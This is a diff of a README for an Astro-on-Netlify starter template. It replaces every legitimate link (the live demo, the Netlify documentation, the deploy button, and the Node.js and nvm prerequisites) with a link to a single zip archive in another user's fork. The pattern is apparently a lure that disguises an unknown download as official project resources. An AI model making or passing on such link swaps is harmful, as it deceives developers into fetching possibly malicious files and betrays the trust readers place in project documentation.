@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip)
 
-A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blobs).
+A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip) (Edge Functions, Image CDN, Blobs).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip)](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [Node.js](https://nodejs.org/) v18.20.8+.                                    |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [Node.js](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip) v18.20.8+.                                    |
+| (optional) [nvm](https://github.com/rayshiva/astro-platform-starternew/raw/refs/heads/main/src/platform-starternew-astro-dolefish.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
